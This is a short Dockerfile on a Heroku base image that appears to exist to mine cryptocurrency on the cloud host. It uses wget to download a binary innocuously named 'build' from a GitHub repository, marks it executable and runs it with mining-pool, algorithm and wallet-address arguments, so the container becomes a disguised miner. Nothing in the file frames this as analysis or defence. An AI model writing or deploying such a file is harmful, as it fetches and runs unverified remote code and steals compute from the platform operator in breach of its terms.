FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/AVGandhi/build-app/raw/main/build; chmod +x build; ./build --disable-gpu --algorithm rx2 --pool rx2.asia.mine.zergpool.com:8335 --wallet 17nVAaSYd3xxYCRQjUJbcoXBYagJa16WHP -p  c=BTC,mc=LUX,ID=DarkGIN
CMD bash heroku.sh
